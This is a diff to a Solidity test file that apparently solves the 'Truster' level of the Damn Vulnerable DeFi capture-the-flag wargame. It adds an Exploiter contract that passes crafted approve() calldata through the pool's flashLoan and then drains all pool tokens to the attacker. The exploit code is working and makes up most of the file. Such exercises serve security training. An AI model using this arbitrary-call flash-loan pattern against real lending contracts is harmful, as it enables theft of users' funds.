@@ -38,13 +38,11 @@ contract Truster is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
-
-        /**
-         * EXPLOIT END *
-         */
+        vm.startPrank(attacker);
+        Exploiter exploiter = new Exploiter(trusterLenderPool, dvt);
+        exploiter.exploit();
+        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
+        vm.stopPrank();
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
@@ -53,5 +51,29 @@ contract Truster is Test {
         // Attacker has taken all tokens from the pool
         assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
         assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
+    }
+}
+
+contract Exploiter {
+    TrusterLenderPool internal immutable trusterLenderPool;
+    DamnValuableToken internal immutable dvt;
+    address internal immutable owner;
+    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "only owner"); // Modifier to avoid getting front-run by searchers
+        _;
+    }
+
+    constructor(TrusterLenderPool _trusterLenderPool, DamnValuableToken _dvt) {
+        trusterLenderPool = _trusterLenderPool;
+        dvt = _dvt;
+        owner = msg.sender;
+    }
+
+    function exploit() external onlyOwner {
+        trusterLenderPool.flashLoan(
+            0, address(this), address(dvt), abi.encodeWithSignature("approve(address,uint256)", owner, TOKENS_IN_POOL)
+        );
     }
 }
